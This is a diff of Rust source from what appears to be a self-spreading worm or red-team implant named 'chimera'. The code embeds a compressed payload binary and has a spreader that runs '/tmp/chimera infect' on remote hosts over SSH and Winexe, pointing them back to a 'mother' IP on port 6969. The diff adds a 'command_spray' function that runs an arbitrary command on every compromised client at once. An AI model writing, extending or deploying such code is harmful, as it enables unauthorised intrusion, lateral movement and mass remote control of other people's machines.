@@ -1,21 +1,25 @@
-use crate::net::communicator::{Credentials, Session};
+use crate::net::{
+    communicator::{Credentials, Session},
+    enumeration::ping::Enumerator,
+    ssh::{SSHClient, SSHSession},
+    types::{Host, OS},
+    winexe::{WinexeClient, WinexeSession},
+};
 use anyhow::anyhow;
 use flate2::read::ZlibDecoder;
-use tokio::fs::File;
-use tokio::time::{timeout, Duration};
-// use crate::net::enumeration::ping::Enumerator;
-use crate::net::enumeration::ping::Enumerator;
-// use crate::net::session_pool::SessionPool;
-use crate::net::ssh::{SSHClient, SSHSession};
-use crate::net::types::{Host, OS};
-use crate::net::winexe::{WinexeClient, WinexeSession};
 use futures::future::join_all;
 use local_ip::get_local_ip;
-use std::io::{self, Read, Write};
-use std::str;
-use std::sync::Arc;
-use tokio::io::{AsyncReadExt, AsyncWriteExt};
-use tokio::net::TcpStream;
+use std::{
+    io::{self, Read, Write},
+    str,
+    sync::Arc,
+};
+use tokio::{
+    fs::File,
+    io::{AsyncReadExt, AsyncWriteExt},
+    net::TcpStream,
+    time::{timeout, Duration},
+};
 
 // Include the bytes of chimera at create::bin::chimera
 const CHIMERA: &[u8] = include_bytes!("../../../bin/chimera.zlib");
@@ -23,6 +27,22 @@ const CHIMERA: &[u8] = include_bytes!("../../../bin/chimera.zlib");
 pub enum SessionType {
     SSH(SSHSession),
     Winexe(WinexeSession),
+}
+
+impl SessionType {
+    pub async fn close(&self) {
+        let _ = match self {
+            SessionType::SSH(session) => session.close().await,
+            SessionType::Winexe(session) => session.close().await,
+        };
+    }
+
+    pub async fn execute_command(&self, command: &str) -> anyhow::Result<Option<String>> {
+        match self {
+            SessionType::SSH(session) => Ok(session.execute_command(command).await?),
+            SessionType::Winexe(session) => Ok(session.execute_command(command).await?),
+        }
+    }
 }
 
 pub struct ConnectionPool {
@@ -200,8 +220,34 @@ impl Spreader {
         let cmd = format!("/tmp/chimera infect -m {} -p 6969", mother_ip);
         session.execute_command(&cmd).await?;
 
-        session.close().await?;
         Ok(())
+    }
+
+    // Executes command on all clients of a given session type (SSH or Winexe)
+    pub async fn command_spray(&self, session_type: &str, command: &str) {
+        let futures = self
+            .pool
+            .clients
+            .iter()
+            .filter(|client| match session_type {
+                "SSH" => matches!(client.1, SessionType::SSH(_)),
+                "WINEXE" => matches!(client.1, SessionType::Winexe(_)),
+                _ => panic!("Invalid session type"),
+            })
+            .map(|client| client.1.execute_command(command))
+            .collect::<Vec<_>>();
+
+        join_all(futures).await;
+    }
+
+    pub async fn close(&self) {
+        let mut futures = Vec::new();
+
+        for client in self.pool.clients.iter() {
+            futures.push(client.1.close());
+        }
+
+        join_all(futures).await;
     }
 }
 
